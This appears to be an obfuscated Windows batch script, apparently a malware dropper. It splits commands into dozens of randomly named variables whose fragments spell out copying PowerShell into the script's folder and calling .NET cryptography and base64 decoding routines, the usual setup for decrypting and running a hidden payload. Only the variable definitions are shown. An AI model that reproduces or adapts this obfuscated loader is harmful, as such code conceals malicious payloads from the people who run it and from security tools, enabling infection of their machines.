@echo off
set "AcASTFBgNe=do"
set "wcWUFwfFmI=em"
set "UPqWcoIMnT=0\"
set "RylOvFWToU=he"
set "aKnFRfFtHh=.e"
set "gCDehzKDuT=xe"
set "AIXUMFIMBg=Sy"
set "XsmFDRIEQy=we"
set "voNKgjdMim=ll"
set "cFCkrQKzqK=rs"
set "enxqSxLcpq=in"
set "poWyzrbNmN=Wi"
set "jjoyPYnYzI=we"
set "neroNWRnPX=st"
set "lGDgCMCeLU=co"
set "FawsYywMEP=\v"
set "PJyKeWUaQu=he"
set "jxLNGBvjIc= C"
set "CwxucOULmE=rS"
set "vnImOLASge=ll"
set "TixKedClyE=\W"
set "avdKydKOpR=py"
set "UUgHEZjnsc=Po"
set "iTzlBVBnno=s\"
set "kyzfUhVQoe=:\"
set "rtwIJBVYQr=ow"
set "pRslKfwTTY=y "
set "BpsLdnFmQB=ws"
set "emifmPWpvG= /"
set "LiDZYQcTPX=po"
set "pEQNENUQza=nd"
set "mHDlAIvBVd=32"
set "exaOlygxkX=1."
set "mcKwTbqaWP=cd"
set "fQuzUefxyO= %~dp0"
set "VoGTIGpzpH=RR.T"
set "XPnfvgBDBp=saBm"
set "IvXKLrIllN= [Sy"
set "MUUsHCUxft=iron"
set "iVxpTjCFKB=.Cry"
set "JWofIQwBGN=ptor"
set "CjCdwhdFmk=Syst"
set "fhYxNXAtRn='gni"
set "ykLnHdemeu===')"
set "mmptugzolG=gEO."
set "lNXOfqUwTC=y.Cr"
set "MvVnQaYdcy=dj0C"
set "IuoKwTQDHt=grap"
set "BcxjouPUIh=e = "
set "dEUmkuIcVk=lBlo"
set "yDHxolpHuM=morF"
set "cErBXMrYxK=1..-"
set "VJknRhhIPy=[Sys"
set "fBSxZBSrZH=tion"
set "KkpvSKIGHH=t Sy"
set "VbMMtovUha=eent"
set "RbtfylLkat=oint"
set "VcMreCCVbX=gsYZ"
set "DrZxeEpXif=$GTU"
set "dQLqQZoOYk= [Sy"
set "VmWwNFdDwL=..-1"
set "zhAIRfOtuK=in $"
set "AQeNcXylAa=Fina"
set "tosGkXlLJC=se()"
set "rYPFMrNIAK=rity"
set "LXJjJjvxpH=Aj ="
set "vQYzAcdjVF=.Com"
set "JQIgAdMpCV=Star"
set "CUdHfBFeDv=em.I"
